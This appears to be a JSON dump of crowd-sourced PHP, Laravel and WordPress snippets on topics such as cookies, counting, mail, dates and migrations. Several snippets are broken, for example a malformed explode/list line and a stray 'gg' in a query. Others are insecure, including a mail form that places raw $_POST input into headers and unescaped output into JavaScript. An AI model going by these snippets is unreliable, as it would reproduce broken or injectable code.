    "description": "$theDate    = new DateTime('2020-03-08'); echo $stringDate = $theDate->format('Y-m-d H:i:s');  //output: 2020-03-08 00:00:00\nphpCopy$theDate    = new DateTime('2020-03-08'); echo $stringDate = $theDate->format('Y-m-d H:i:s');  //output: 2020-03-08 00:00:00 \n$dateFormat = new DateTime(); // this will return current date echo $stringDate = $date->format(DATE_ATOM);  //output: 2020-03-08T12:54:56+01:00\n$date = explode(\"/\",date('d/m/Y/h/i/s') list($day,$month,$year,$hour,$min,$sec) = $date); echo $month.'/'.$day.'/'.$year.' '.$hour.':'.$min.':'.$sec;  //output: 03/08/2020 02:01:06\nphpCopy$date = explode(\"/\",date('d/m/Y/h/i/s') list($day,$month,$year,$hour,$min,$sec) = $date); echo $month.'/'.$day.'/'.$year.' '.$hour.':'.$min.':'.$sec;  //output: 03/08/2020 02:01:06 \n$date = date_create_from_format('d M, Y', '08 Mar, 2020'); echo $newFormat = date_format($date,\"Y/m/d H:i:s\");  //output: 2020/03/08 00:00:00\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 806,
    "keyword": null,
    "link": null,
    "title": " cookie are not set in php",
    "description": "setcookie('username',$username,time()+60*60*24*365); // 'Force' the cookie to exists $_COOKIE['username'] = $username;\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 807,
    "keyword": null,
    "link": null,
    "title": " cookies php syntax",
    "description": "//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. ==================== Version 1 for cookies ====================  <?php if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }   ==================== Version 2 for cookies ==================== <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ======================= Version 3 for cookies =======================  <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day     //to unset a cookie just set the time that is already past     //delete cookie     setcookie('nameofcookie','Frank', time() -3600);  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ========================= Version 4 check for cookies ========================= <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day      if(count($_COOKIE) > 0){         echo 'There are ' . count($_COOKIE)  .  ' cookies saved<br>';         }else{             echo 'There are no cookies saved<br>';         }  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; } \n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible.  <?php if(isset($_POST['submit'])){     $username = htmlentities($_POST['username']);      setcookie('nameofcookie', $username, time()+3600);      //1hour time limit      header('Location: page2.php'); } ?>  <!DOCTYPE html> <html> <head>     <title>PHP Cookies</title> </head> <body>         <form method=\"POST\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">                 <input type=\"text\" name=\"username\" placeholder=\"Enter Username\">                 <br>                 <input type=\"submit\" name=\"submit\" value=\"Submit\">             </form>         </div> </body> </html>\nsetcookie ('name', 'value', $expiresOn, $path, $domain, $secure, $httponly)\nsetcookie(\"cookie_name\", \"type_on_cookie\", expiry_time(), \"/\");\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 808,
    "keyword": null,
    "link": null,
    "title": " copy file path in phpstorm",
    "description": "Press Ctrl+Shift+C  copy file path in php storm\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 809,
    "keyword": null,
    "link": null,
    "title": " copy php array to javascript",
    "description": "var js_array = [<?php echo '\"'.implode('\",\"', $php_array).'\"' ?>];\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 810,
    "keyword": null,
    "link": null,
    "title": " core php mail function without phpmailer",
    "description": "<?php ini_set('display_errors',1); ini_set('display_startup_errors',1); error_reporting(-1);  session_start();  $to = 'toSenderEmail@xxxxx.xxxxx'; $subject = 'Subject xxxxx xxxxxx';  $headers = \"MIME-Version: 1.0\\r\\n\"; $headers .= \"Content-Type: text/html; charset=charset=utf-8\\r\\n\"; $headers .= \"From: \" . $_POST['email'] . \"\\r\\n\"; //$headers .= \"Reply-To: \". $_POST['email'] . \"\\r\\n\"; $headers .= \"CC: xxx@xxxxx.xxx\\r\\n\";    $message = \"<html><body>\";  $message .= '<table style=\"border-color: #666; background: #eee; cellpadding=\"10\">'; $message .= \"<tr><td><strong>Name:</strong> </td><td>\" . $_POST['username'] . \"</td></tr>\"; $message .= \"<tr><td><strong>Email:</strong> </td><td>\" . $_POST['email'] . \"</td></tr>\";    $message .= \"</table>\"; $message .= \"</body></html>\";   echo $message; //echo $headers;    $response=mail($to, $subject, $message, $headers);  if($response==1) { echo \"<script language='javascript' type='text/javascript'>                 window.location = 'index.html';     </script>\";  } else{ echo  \"<script language='javascript' type='text/javascript'>         alert('mail send failed');     </script>\"; }    ?>\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 811,
    "keyword": null,
    "link": null,
    "title": " corsair k70 rgb mk.2",
    "description": "HI dad\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 812,
    "keyword": null,
    "link": null,
    "title": " count() parameter must be an array or an object that implements countable laravel",
    "description": "//add a typecast array to the array being called $count = count((array)$originalArray);\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 813,
    "keyword": null,
    "link": null,
    "title": " count an array in php",
    "description": "<?php  $vegetables = [\"Cabbage\", \"Carrot\", \"Lettuce\"];  $arrayLength = count($vegetables);  echo $arrayLength; //returns 3 ?>\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 814,
    "keyword": null,
    "link": null,
    "title": " count in laravel'",
    "description": "$count = ModelName::where('id',$id)->count();\n$count = Model::where('status','=','1')->count();\n      {{ $threads->count() }} \n      {{ count($threads) }} \n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 815,
    "keyword": null,
    "link": null,
    "title": " count number of rows laravel controller",
    "description": "$wordlist = Wordlist::where('id', '<=', $correctedComparisons)->get(); $wordCount = $wordlist->count(); \n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 816,
    "keyword": null,
    "link": null,
    "title": " count object php",
    "description": "$total = count((array)$obj);\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 817,
    "keyword": null,
    "link": null,
    "title": " count php",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n$sql = \"SELECT COUNT(*) AS total from Members\"; $result = $conn->query($sql); $data =  $result->fetch_assoc(); echo $data['total'];\n<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\n$cars = array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); // 3\n <?php $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));  $b[0]  = 7; $b[5]  = 9; $b[10] = 11; var_dump(count($b));  var_dump(count(null));  var_dump(count(false)); ?>   /* result       int(3) int(3)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 12 // as of PHP 7.2 int(0)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 14 // as of PHP 7.2 int(1)  */  \n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 818,
    "keyword": null,
    "link": null,
    "title": " count sql query in php",
    "description": "$result=mysql_query(\"SELECT count(*) as total from Students\"); $data=mysql_fetch_assoc($result); echo $data['total']; \n$sql = \"SELECT COUNT(*) AS total from Members\"; $result = $conn->query($sql); $data =  $result->fetch_assoc(); echo $data['total'];\nPHP Count result\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 819,
    "keyword": null,
    "link": null,
    "title": " count with left join in laravel",
    "description": "$areas = Area::select('areas.*', DB::raw('count(area_id) as connections')) \t->leftJoin('object_areas', 'object_areas.area_id', '=', 'areas.id') \t->groupBy('areas.id') \t->get();\n$areas = Area::select('areas.*', DB::raw('count(area_id) as connections')) \t->leftJoin('object_areas', 'object_areas.area_id', '=', 'areas.id') \t->groupBy('areas.id')     \t->get();\n$areas = Area::select('areas.*', DB::raw('count(area_id) as connections')) \t->leftJoin('object_areas', 'object_areas.area_id', '=', 'areas.id') \t->groupBy('areas.id')gg \t->get();\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 820,
    "keyword": null,
    "link": null,
    "title": " counting a string in php",
    "description": "strlen('your strings here!');\n",
    "reg_date": "2021-10-12T10:13:22.000Z"
  },
  {
    "id": 821,
    "keyword": null,
    "link": null,
    "title": " countphp",
    "description": "<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 822,
    "keyword": null,
    "link": null,
    "title": " cpanel file manager",
    "description": "this is cpanel \n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 823,
    "keyword": null,
    "link": null,
    "title": " créer projet laravel",
    "description": "composer create-project --prefer-dist laravel/laravel nom_projet\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 824,
    "keyword": null,
    "link": null,
    "title": " create a blank page wordpress",
    "description": "To add a new page, 1. Go To Dashboard -> Pages -> Add New and Give it a title. 2. In the post editor page, there is a box on the right called \t&ldquo;Page Attributes&ldquo;. From this box, you can select multiple page templates.  \tSelect &ldquo;Blank Page Template&rdquo; and save the page.\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 825,
    "keyword": null,
    "link": null,
    "title": " create a class in php",
    "description": "<?php class Fruit {   public $name;   public $color;    function __construct($name, $color) {     $this->name = $name;     $this->color = $color;   }   function get_name() {     return $this->name;   }   function get_color() {     return $this->color;   } }  $apple = new Fruit(\"Apple\", \"red\"); echo $apple->get_name(); echo \"<br>\"; echo $apple->get_color(); ?>\nclass Bike {     \tfunction Bike() {             $this->type = 'BMX';     } }  $blackSheep = new Bike();  print $blackSheep->type;\n <?php class Foo {     public $aMemberVar = 'aMemberVar Member Variable';     public $aFuncName = 'aMemberFunc';             function aMemberFunc() {         print 'Inside `aMemberFunc()`';     } }  $foo = new Foo;  function getVarName() {      return 'aFuncName';  }  print $foo->{$foo->{getVarName()}}();  \nThe  PHP Object-Oriented Programming concepts are: Class  Objects Inheritance Interface Abstraction Magic Methods\nvar numbers = [10, 20, 30, 40] // sums to 100var sum = 0;for (var i = 0; i < numbers.length; i++) {  sum += numbers[i]}\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 826,
    "keyword": null,
    "link": null,
    "title": " create a exporter in laravel command",
    "description": "php artisan make:export UsersExport --model=User \n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 827,
    "keyword": null,
    "link": null,
    "title": " create a function that checks the values of the indexes in two arrays and keep a score",
    "description": " const triplets = (arr1,arr2) => {   let score1 = 0;   let score2 = 0;   let resultArr = [0,0]   for (let i = 0; i < arr1.length; i++){     if(arr1[i] === arr2[i]) {       resultArr[0] = score1       resultArr[1] = score2     } else if (arr1[i] > arr2[i]) {       score1++       resultArr[0] = score1     } else if (arr1[i] < arr2[i]) {       score2++       resultArr[1] = score2     }   }   return resultArr }\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 828,
    "keyword": null,
    "link": null,
    "title": " create a user using factory laravel",
    "description": "1. Create a factory: \tphp artisan make:factory ItemFactory --model=Item        Import Illuminate\\Database\\Eloquent\\Factories\\HasFactory trait to your model:  use Illuminate\\Database\\Eloquent\\Factories\\HasFactory; use Illuminate\\Database\\Eloquent\\Model;  class Item extends Model {     use HasFactory;      // ... }  2. Use it like this: \t \t$item = Item::factory()->make(); // Create a single App\\Models\\Item instance  \t// or  \t$items = Item::factory()->count(3)->make(); // Create three App\\Models\\Item instances  3. Use create method to persist them to the database:    $item = Item::factory()->create(); // Create a single App\\Models\\Item instance and persist to the database    // or    $items = Item::factory()->count(3)->create(); // Create three App\\Models\\Item instances and persist to the database \n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 829,
    "keyword": null,
    "link": null,
    "title": " create admin password in magento 2",
    "description": "bin/magento admin:user:create --admin-user=\"admin2\" --admin-password=\"admin123\" --admin-email=\"testme@testme.com\" --admin-firstname=\"Amin\" --admin-lastname=\"Admin\"\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 830,
    "keyword": null,
    "link": null,
    "title": " create and download text file in php",
    "description": "$file = \"test.txt\"; $txt = fopen($file, \"w\") or die(\"Unable to open file!\"); fwrite($txt, \"lorem ipsum\"); fclose($txt);  header('Content-Description: File Transfer'); header('Content-Disposition: attachment; filename='.basename($file)); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); header(\"Content-Type: text/plain\"); readfile($file);\n",
    "reg_date": "2021-10-12T10:13:23.000Z"
  },
  {
    "id": 831,
    "keyword": null,
    "link": null,
    "title": " create array from string with commas php",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray); \n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 832,
    "keyword": null,
    "link": null,
    "title": " create child theme in wordpress",
    "description": "/*  Theme Name:   WPB Child Theme  Theme URI:    https://www.wpbeginner.com  Description:  A Twenty Thirteen child theme   Author:       WPBeginner  Author URI:   https://www.wpbeginner.com  Template:     twentythirteen  Version:      1.0.0 */   @import url(\"../twentythirteen/style.css\");   .site-title { padding: 30px 0 30px; }   .site-header .home-link { min-height: 0px; }   .navbar { background-color: #e8e5ce; }   .widget {  background-color: #e8e5ce; } .site-footer { background-color: #d8cdc1; }  .site-footer .sidebar-container {  background-color:#533F2A } \n/*  Theme Name:   Twenty Fifteen Child  Theme URI:    http://example.com/twenty-fifteen-child/  Description:  Twenty Fifteen Child Theme  Author:       John Doe  Author URI:   http://example.com  Template:     twentyfifteen  Version:      1.0.0  License:      GNU General Public License v2 or later  License URI:  http://www.gnu.org/licenses/gpl-2.0.html  Tags:         light, dark, two-columns, right-sidebar, responsive-layout, accessibility-ready  Text Domain:  twentyfifteenchild */ \nadd_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );  function enqueue_parent_styles() {    wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css' ); } \nadd_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' ); function my_theme_enqueue_styles() {     wp_enqueue_style( 'child-style', get_stylesheet_uri(),         array( 'parenthandle' ),          wp_get_theme()->get('Version') // this only works if you have Version in the style header     ); } \n/* Theme Name: Twenty Fifteen Child Theme URI: http://example.com/twenty-fifteen-child/ description: >-   Twenty Fifteen Child Theme Author: John Doe Author URI: http://example.com Template: twentyfifteen Version: 1.0.0 License: GNU General Public License v2 or later License URI: http://www.gnu.org/licenses/gpl-2.0.html Tags: light, dark, two-columns, right-sidebar, responsive-layout, accessibility-ready Text Domain: twenty-fifteen-child */ \n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 833,
    "keyword": null,
    "link": null,
    "title": " create contoller with model and migration",
    "description": "php artisan make:model Todo -mcr \n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 834,
    "keyword": null,
    "link": null,
    "title": " create controller codeigniter 3",
    "description": "<?php class Pages extends CI_Controller {          public function view($page = 'home')         {         } } \n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 835,
    "keyword": null,
    "link": null,
    "title": " create controller in laravel command line",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller NameController\nphp artisan make:controller ShowProfile\n <?php  namespace App\\Console\\Commands;  use Illuminate\\Console\\Command; use App\\Http\\Controllers\\HelloWorldController;  class MakeImportsCommand extends Command {     /**      * The name and signature of the console command.      *      * @var string      */     protected $signature = 'helloworld';      /**      * The console command description.      *      * @var string      */     protected $description = 'Say Hello World Controller';      /**      * Create a new command instance.      *      * @return void      */     public function __construct()     {         parent::__construct();     }      /**      * Execute the console command.      *      * @return mixed      */     public function handle()     {         return $this -> helloWorld();      } } \n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 836,
    "keyword": null,
    "link": null,
    "title": " create custom image size wordpress",
    "description": "add_image_size( 'custom-size', 220, 180 ); // 220 pixels wide by 180 pixels tall, soft proportional crop mode  add_image_size( 'custom-size', 220, 180, true ); // 220 pixels wide by 180 pixels tall, hard crop mode  add_image_size( 'custom-size', 220, 220, array( 'left', 'top' ) ); // Hard crop left top\n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 837,
    "keyword": null,
    "link": null,
    "title": " create custom page template wordpress",
    "description": "/*           make this file in template-parts folder                   give file name as category_post.php        */  <?php /**  * Template Name: Category Custom Page  */   get_header(); ?>   <div id=\"primary\" class=\"content-area\">     <main id=\"main\" class=\"site-main\" role=\"main\">       <?php     $args = array(         'post_type' => 'post',         'post_status' => 'publish',         'category_name' => 'wordpress',         'posts_per_page' => 5,     );     $arr_posts = new WP_Query( $args );       if ( $arr_posts->have_posts() ) :           while ( $arr_posts->have_posts() ) :             $arr_posts->the_post();             ?>             <article id=\"post-<?php the_ID(); ?>\" <?php post_class(); ?>>                 <?php                 if ( has_post_thumbnail() ) :                     the_post_thumbnail();                 endif;                 ?>                 <header class=\"entry-header\">                     <h1 class=\"entry-title\"><?php the_title(); ?></h1>                 </header>                 <div class=\"entry-content\">                     <?php the_excerpt(); ?>                     <a href=\"<?php the_permalink(); ?>\">Read More</a>                 </div>             </article>             <?php         endwhile;         wp_pagenavi(             array(                 'query' => $arr_posts,             )         );     endif;     ?>       </main><!-- .site-main --> </div><!-- .content-area -->   <?php get_footer(); ?>\n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 838,
    "keyword": null,
    "link": null,
    "title": " create custom pagination in laravel 7 for api",
    "description": "<?php    namespace App\\Http\\Controllers;    use Illuminate\\Http\\Request; use Illuminate\\Pagination\\Paginator; use Illuminate\\Support\\Collection; use Illuminate\\Pagination\\LengthAwarePaginator;    class PaginationController extends Controller {     /**      * The attributes that are mass assignable.      *      * @var array      */     public function index()     {         $myArray = [             ['id'=>1, 'title'=>'Laravel 6 CRUD'],             ['id'=>2, 'title'=>'Laravel 6 Ajax CRUD'],             ['id'=>3, 'title'=>'Laravel 6 CORS Middleware'],             ['id'=>4, 'title'=>'Laravel 6 Autocomplete'],             ['id'=>5, 'title'=>'Laravel 6 Image Upload'],             ['id'=>6, 'title'=>'Laravel 6 Ajax Request'],             ['id'=>7, 'title'=>'Laravel 6 Multiple Image Upload'],             ['id'=>8, 'title'=>'Laravel 6 Ckeditor'],             ['id'=>9, 'title'=>'Laravel 6 Rest API'],             ['id'=>10, 'title'=>'Laravel 6 Pagination'],         ];            $myCollectionObj = collect($myArray);            $data = $this->paginate($myCollectionObj);             return view('paginate', compact('data'));     }         /**      * The attributes that are mass assignable.      *      * @var array      */     public function paginate($items, $perPage = 5, $page = null, $options = [])     {         $page = $page ?: (Paginator::resolveCurrentPage() ?: 1);         $items = $items instanceof Collection ? $items : Collection::make($items);         return new LengthAwarePaginator($items->forPage($page, $perPage), $items->count(), $perPage, $page, $options);     } }  # Blade file <div class=\"container\">     <table class=\"table table-bordered\">         <tr>             <th>Id</th>             <th>Title</th>         </tr>         @foreach($data as $post)         <tr>             <td>{{ $post->id }}</td>             <td>{{ $post->title }}</td>         </tr>         @endforeach     </table> </div>     {{ $data->links() }}\n @if ($paginator->hasPages())     <ul class=\"pager\">                 @if ($paginator->onFirstPage())             <li class=\"disabled\"><span>&larr; Previous</span></li>         @else             <li><a href=\"{{ $paginator->previousPageUrl() }}\" rel=\"prev\">&larr; Previous</a></li>         @endif                  @foreach ($elements as $element)                         @if (is_string($element))                 <li class=\"disabled\"><span>{{ $element }}</span></li>             @endif                           @if (is_array($element))                 @foreach ($element as $page => $url)                     @if ($page == $paginator->currentPage())                         <li class=\"active my-active\"><span>{{ $page }}</span></li>                     @else                         <li><a href=\"{{ $url }}\">{{ $page }}</a></li>                     @endif                 @endforeach             @endif         @endforeach                    @if ($paginator->hasMorePages())             <li><a href=\"{{ $paginator->nextPageUrl() }}\" rel=\"next\">Next &rarr;</a></li>         @else             <li class=\"disabled\"><span>Next &rarr;</span></li>         @endif     </ul> @endif \nfollow this link  https://github.com/spatie/laravel-json-api-paginate\n",
    "reg_date": "2021-10-12T10:13:24.000Z"
  },
  {
    "id": 839,
    "keyword": null,
    "link": null,
    "title": " create database in phpmyadmin",
    "description": "//To create database you can execute below query >create database db_name\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 840,
    "keyword": null,
    "link": null,
    "title": " create date from string php",
    "description": "$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n$element = '15-Feb-2009'; $date = DateTime::createFromFormat('j-M-Y', $element);\nDate to string  $date = \"2021/03/13\"; $newdate= date('d M, Y', strtotime($date)); echo $newdate;\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 841,
    "keyword": null,
    "link": null,
    "title": " create empty 2d array php",
    "description": "<?php     $emptyArray = [[]]; ?>\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 842,
    "keyword": null,
    "link": null,
    "title": " create folder php",
    "description": "// Create folder if not exist \t\t$folderName = 'images/gallery'; \t\t$config['upload_path'] = $folderName; \t\tif(!is_dir($folderName)) \t\t{ \t\t\tmkdir($folderName, 0777); \t\t}\n// Create a directory with the permission level (optional) <?php mkdir(\"/path/to/my/dir\", 0700); ?>\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 843,
    "keyword": null,
    "link": null,
    "title": " create foreign key laravel migration",
    "description": "Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n$table->bigInteger('votes');\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 844,
    "keyword": null,
    "link": null,
    "title": " create foreign key phpmyadmin",
    "description": "ALTER TABLE table_name ADD CONSTRAINT fk_foreign_key_name FOREIGN KEY (foreign_key_name) REFERENCES target_table(target_key_name);\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 845,
    "keyword": null,
    "link": null,
    "title": " create form request laravel",
    "description": "php artisan make:request StoreBlogPost\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n# <values> = foo,bar,... # <field> = array field # <characters> = amount of characters  # accepted\t\t\t\t\t           # active_url # after:<tomorrow>\t\t\t           # after_or_equal:<tomorrow> # alpha\t\t\t\t\t\t           # alpha_dash # alpha_num\t\t\t\t\t           # array # bail \t\t\t\t\t               # before:<today> # before_or_equal:<today>              # between:min,max # boolean\t\t\t\t\t           # confirmed # date\t\t\t\t\t\t           # date_equals:<today> # date_format:<format> \t\t           # different:<name> # digits:<value>\t\t\t           # digits_between:min,max # dimensions:<min/max_with>\t           # distinct # email\t\t\t\t\t\t           # ends_with:<values> # exclude_if:<field>,<value>           # exclude_unless:<field>,<value> # exists:<table>,<column>\t           # file # filled\t\t\t\t\t           # gt:<field> # gte:<field>\t\t\t\t           # image # in:<values>\t\t\t\t           # in_array:<field> # integer\t\t\t\t\t           # ip # ipv4                                 # ipv6   # json\t\t\t\t\t\t           # lt:<field> # lte:<field>       \t\t           # max:<value> # mimetypes:video/avi,...\t           # mimes:jpeg,bmp,png # min:<value>\t\t\t\t           # not_in:<values> # not_regex:<pattern> \t\t           # nullable # numeric\t\t\t\t\t           # password:<auth guard> # present\t\t\t\t\t           # regex:<pattern> # required\t\t\t\t\t           # required_if:<field>,<value> # required_unless:<field>,<value>      # required_with:<fields> # required_with_all:<fields>\t       # required_without:<fields> # required_without_all:<fields>        # same:<field> # size:<characters>\t\t\t           # starts_with:<values> # string\t\t\t\t\t\t       # timezone # unique:<table>,<column>\t\t       # url # uuid\n       $messsages = array( \t\t'email.required'=>'You cant leave Email field empty', \t\t'name.required'=>'You cant leave name field empty',                 'name.min'=>'The field has to be :min chars long', \t);  \t$rules = array( \t\t'email'=>'required|unique:content', \t\t'name'=>'required|min:3', \t);  \t$validator = Validator::make(Input::all(), $rules,$messsages); \n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 846,
    "keyword": null,
    "link": null,
    "title": " create guid in php",
    "description": "function guidv4() {     if (function_exists('com_create_guid') === true)         return trim(com_create_guid(), '{}');      $data = openssl_random_pseudo_bytes(16);     $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // set version to 0100     $data[8] = chr(ord($data[8]) & 0x3f | 0x80); // set bits 6-7 to 10     return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4)); }\n",
    "reg_date": "2021-10-12T10:13:25.000Z"
  },
  {
    "id": 847,
    "keyword": null,
    "link": null,
    "title": " create laravel project 8.16.1",
    "description": "composer create-project --prefer-dist laravel/laravel:8.16.1 blog\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 848,
    "keyword": null,
    "link": null,
    "title": " create laravel project old version",
    "description": "composer create-project laravel/laravel your-project-name 4.0.*\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 849,
    "keyword": null,
    "link": null,
    "title": " create laravel project specific version",
    "description": "composer create-project laravel/laravel=\"5.1.*\" appName\ncomposer create-project laravel/laravel=7.0 my-project-name --prefer-dist\ncomposer create-project laravel/laravel=4.1.27 your-project-name --prefer-dist\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 850,
    "keyword": null,
    "link": null,
    "title": " create menu in wordpress",
    "description": "function wpb_custom_new_menu() {   register_nav_menus(     array(       'my-custom-menu' => __( 'My Custom Menu' ),       'extra-menu' => __( 'Extra Menu' )     )   ); } add_action( 'init', 'wpb_custom_new_menu' ); \nfunction wpb_custom_new_menu() {   register_nav_menus(     array(       'my-custom-menu' => __( 'My Custom Menu' ),       'extra-menu' => __( 'Extra Menu' )     )   ); } add_action( 'init', 'wpb_custom_new_menu' ); <?php wp_nav_menu( array(      'theme_location' => 'my-custom-menu',      'container_class' => 'custom-menu-class' ) );  ?>\n<?php wp_nav_menu( array(      'theme_location' => 'my-custom-menu',      'container_class' => 'custom-menu-class' ) );  ?> \n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 851,
    "keyword": null,
    "link": null,
    "title": " create migration, controller, model and  seeder laravel",
    "description": "php artisan make:model MODEL_PATH\\MODEL_NAME -mcrs or php artisan make:model MODEL_PATH\\MODEL_NAME -a    -a, --all Generate a migration, factory, and resource controller for the model  -m, --migration Create a new migration file for the model. -c, --controller Create a new controller for the model. -r, --resource Indicates if the generated controller should be a resource controller -s, --seeder Create a new seeder file for the model.\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 852,
    "keyword": null,
    "link": null,
    "title": " create migration command in laravel",
    "description": "php artisan make:migration create_users_table \nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\n//to create migration file in PHP use the artisan command \"make\" php artisan make:migration create_users_table // migration file must follow the naming convention \"operation_tableName_table\" //Migration file to add column naming convention would be \"add_tablename_table\"\nphp artisan make:model Employee -m\nphp artisan make:migration CreateUsersTable\n$table->string('name', 100);\n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 853,
    "keyword": null,
    "link": null,
    "title": " create migration with model laravel",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:migration create_users_table \nphp artisan make:model Settings -m\n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Settings --migration \n",
    "reg_date": "2021-10-12T10:13:26.000Z"
  },
  {
    "id": 854,
    "keyword": null,
    "link": null,
    "title": " create model controller migration factory laravel in one command",
